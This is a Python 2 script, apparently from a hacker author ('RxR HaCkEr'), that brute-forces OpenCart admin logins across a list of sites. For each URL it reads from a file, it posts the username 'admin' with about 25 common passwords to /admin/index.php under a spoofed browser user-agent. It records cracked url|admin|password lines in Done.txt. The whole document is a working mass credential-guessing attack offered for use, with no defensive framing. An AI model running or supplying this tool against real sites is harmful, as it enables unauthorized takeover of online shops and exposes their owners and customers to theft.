#!/usr/bin/python
import sys

banner = ''' 
##############################################################             
______       ______   _   _         _____  _     _____       #
| ___ \      | ___ \ | | | |       /  __ \| |   |  ___|      # 
| |_/ /__  __| |_/ / | |_| |  __ _ | /  \/| | __| |__  _ __  #
|    / \ \/ /|    /  |  _  | / _` || |    | |/ /|  __|| '__| #
| |\ \  >  < | |\ \  | | | || (_| || \__/\|   < | |___| |    #
\_| \_|/_/\_\\_| \_| \_| |_/ \__,_| \____/|_|\_\\____/|_|      #
                                                             #
              Coder:RxR HaCkEr Skype:a.789a                  #
####################Brute Force OpenCart######################\n
'''
print banner


try:
    import requests
except:
    print "Error !! Please Install Requests ...."

headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
list = open(sys.argv[1], 'r').readlines()
for sites in list:
 url = sites.rstrip()
 url = url + "/admin/index.php"
 
 passwords = ['admin','demo','admin123','123456','123456789','123','1234','12345','1234567','12345678','123456789','admin1234','admin123456','pass123','root','321321','123123','112233','102030','password','pass','qwerty','abc123','654321','pass1234']
 for pap in passwords:
  passwd = pap.rstrip()
  try:
   date = {'route=common/home':'route=setting/setting&token=','username':'admin','password': passwd}
   trying = requests.session()
   trying.get(url, timeout=5)
   req = trying.post(url, data=date, headers=dict(Referer=url))
   if 'Logout' in req.text:
    print(open('Done.txt', 'a').write (url+"|admin|"+passwd + '\n')), url, passwd, " Found Password "
   else:
    print url, passwd, 'Password Worng'
	
  except:
   pass
